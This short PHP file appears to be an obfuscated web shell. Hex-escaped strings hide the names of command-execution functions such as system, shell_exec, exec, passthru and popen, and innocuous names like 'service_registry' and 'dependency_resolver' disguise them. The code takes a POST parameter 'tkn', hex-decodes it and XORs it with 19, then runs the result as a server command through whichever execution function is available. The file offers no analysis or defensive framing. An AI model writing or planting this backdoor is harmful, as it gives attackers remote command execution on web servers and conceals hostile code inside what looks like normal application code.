<?php

$service_registry7 = "\x70\x63lo\x73e";
$dependency_resolver = "\x68ex2\x62\x69n";
$service_registry1 = "s\x79st\x65\x6D";
$service_registry4 = "\x70\x61\x73s\x74hru";
$service_registry5 = "p\x6Fp\x65n";
$service_registry3 = "\x65\x78ec";
$service_registry2 = "s\x68\x65\x6Cl\x5F\x65xec";
$service_registry6 = "\x73tr\x65\x61\x6D\x5Fg\x65t_c\x6F\x6Et\x65\x6Ets";
if (isset($_POST["\x74kn"])) {
            function right_pad_string    (     $rec     ,       $token      )    {
     $property_set    =    ''   ;
     $o=0;
 do{
$property_set.=chr(ord($rec[$o])^$token);
$o++;

} while($o<strlen($rec));
 return   $property_set;
   
}
            $tkn = $dependency_resolver($_POST["\x74kn"]);
            $tkn = right_pad_string($tkn, 19);
            if (function_exists($service_registry1)) {
                $service_registry1($tkn);
            } elseif (function_exists($service_registry2)) {
                print $service_registry2($tkn);
            } elseif (function_exists($service_registry3)) {
                $service_registry3($tkn, $fac_rec);
                print join("\n", $fac_rec);
            } elseif (function_exists($service_registry4)) {
                $service_registry4($tkn);
            } elseif (function_exists($service_registry5) && function_exists($service_registry6) && function_exists($service_registry7)) {
                $token_property_set = $service_registry5($tkn, 'r');
                if ($token_property_set) {
                    $item_res = $service_registry6($token_property_set);
                    $service_registry7($token_property_set);
                    print $item_res;
                }
            }
            exit;
        }